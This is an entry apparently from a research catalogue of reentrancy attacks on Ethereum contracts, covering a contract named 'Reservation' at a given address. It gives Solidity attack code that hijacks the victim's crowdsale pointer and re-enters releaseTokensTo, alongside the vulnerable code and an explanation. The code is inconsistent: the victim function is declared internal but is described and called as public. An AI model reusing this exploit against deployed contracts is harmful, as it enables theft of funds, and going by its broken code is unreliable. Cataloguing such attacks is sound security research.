#########
Attack 08
#########

**Contract Name**

Reservation

**Contract Address**

0xf4861b23d0cbf1cf6a3ffb6fe3ac987e87fc1168

**Transaction Count**

1

**Invovled Ethers**

0 Ethers

**Length of the Call Chain**

1 internal function, 1 external function

**Victim Function**

``releaseTokensTo``

**Attack Mechanisim**

Attack code:
::

    contract Attack is UacCrowdsale{
        CrowdsaleBase c = new CrowdsaleBase();

        constructor() payable {}

        function prepare() {
            c.setCrowdsale(this);
        }

        function mintReservationTokens(address to, uint256 amount) public {   
            c.releaseTokensTo(this);
        }

        function() payable {}

        function getvalue() returns (uint) {
            return this.balance;
        }
    }

    contract UacCrowdsale {}

Attacked code:
::

    contract CrowdsaleBase {
        ...
        function releaseTokensTo(address buyer) internal returns(bool) {
            require(validPurchase());

            uint256 overflowTokens;
            uint256 refundWeiAmount;

            uint256 weiAmount = msg.value;
            uint256 tokenAmount = weiAmount.mul(price());

            if (tokenAmount >= availableTokens) {
                capReached = true;
                overflowTokens = tokenAmount.sub(availableTokens);
                tokenAmount = tokenAmount.sub(overflowTokens);
                refundWeiAmount = overflowTokens.div(price());
                weiAmount = weiAmount.sub(refundWeiAmount);
                buyer.transfer(refundWeiAmount);
            }

            weiRaised = weiRaised.add(weiAmount);
            tokensSold = tokensSold.add(tokenAmount);
            availableTokens = availableTokens.sub(tokenAmount);
            mintTokens(buyer, tokenAmount);
            forwardFunds(weiAmount);

            return true;
        }

        ...

        function mintTokens(address to, uint256 amount) private {
            crowdsale.mintReservationTokens(to, amount);
        }

        function setCrowdsale(address _crowdsale) public {
            require(crowdsale == address(0));
            crowdsale = UacCrowdsale(_crowdsale);
        }

        ...

    }

In this case, the attacker can lauch reentrancy attack by calling ``crowdsale.mintReservationTokens(to, amount)``. We firstly reset the address variable ``crowdsale``. Then we need to call victim function ``mintTokens`` to start attack. This can not be done directly, since the function ``mintToken`` is a **private function** (i.e. this function can only accessed by self-functions). However, ``mintTokens`` is called in a **public function** ``releaseTokensTo``. If the attacker call the public function first, and pass all conditions until the call statement, he succeeds.

**Attack.** The attacker call ``prepare`` to reset the value of ``crowdsale`` then call ``mintReservationTokens`` to attack victim.